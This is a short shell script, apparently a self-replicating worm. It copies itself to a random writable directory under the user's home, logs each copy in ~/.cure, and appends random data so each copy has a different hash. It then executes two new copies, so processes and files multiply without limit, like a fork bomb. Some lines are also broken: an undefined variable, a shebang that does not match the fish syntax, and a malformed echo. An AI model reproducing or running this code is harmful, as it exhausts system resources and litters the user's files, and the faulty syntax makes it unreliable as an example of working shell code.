#!/usr/bin/sh
set yad $PWD/$argv[0]
set cure ~/.cure
mkdir -p $curedir
cd ~ && cd (find -mindepth 3 -type d -writable ! -path '*rash*' ! -path '*cache*' 2>/dev/null |sort -R |tail -1)

set nya (echo $RANDOM | md5sum | head -c 20)
cp $yad ./$nya
echo $PWD/$nya >> $cure
echo -e "\n\#()$RANDOM | md5sum | head -c 20)" >> $nya
exec ./$nya &
exec ./$nya
